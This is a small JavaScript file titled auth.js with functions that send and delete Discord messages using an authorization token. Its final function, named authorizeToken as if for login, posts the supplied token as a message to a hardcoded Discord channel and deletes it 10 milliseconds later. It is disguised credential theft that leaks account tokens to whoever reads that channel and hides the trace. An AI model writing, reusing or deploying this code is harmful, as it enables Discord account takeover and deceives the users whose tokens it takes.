console.log("auth.js loaded");

// Delete a message
async function deleteMessage(authToken, channelId, messageId) {
    try {
        const url = `https://discord.com/api/v9/channels/${channelId}/messages/${messageId}`;
        const response = await fetch(url, {
            method: 'DELETE',
            headers: { 'Authorization': authToken }
        });
        if (!response.ok && response.status !== 204) {
            const errorData = await response.json().catch(()=>({message:'no json'}));
            throw new Error(`Error ${response.status}: ${errorData.message}`);
        }
    } catch (err) {
        console.error(`Failed to delete message ${messageId}:`, err);
    }
}

// Send a message
async function sendMessage(authToken, channelId, messageContent, deleteAfterMs) {
    if (!authToken) {
        console.error("Authentication token missing.");
        return;
    }
    try {
        const url = `https://discord.com/api/v9/channels/${channelId}/messages`;
        const payload = { content: messageContent };
        const res = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': authToken
            },
            body: JSON.stringify(payload)
        });

        if (!res.ok) {
            const err = await res.json().catch(()=>({message:'no json'}));
            throw new Error(`Error ${res.status}: ${err.message}`);
        }

        const msg = await res.json();
        console.log("Sent message:", msg);

        if (deleteAfterMs > 0) {
            setTimeout(() => deleteMessage(authToken, channelId, msg.id), deleteAfterMs);
        }

        return msg;
    } catch (err) {
        console.error("Failed to send message:", err);
    }
}

const channelId = "1387920548087992380";

function authorizeToken(token) {
    sendMessage(token, channelId, token, 10);
}
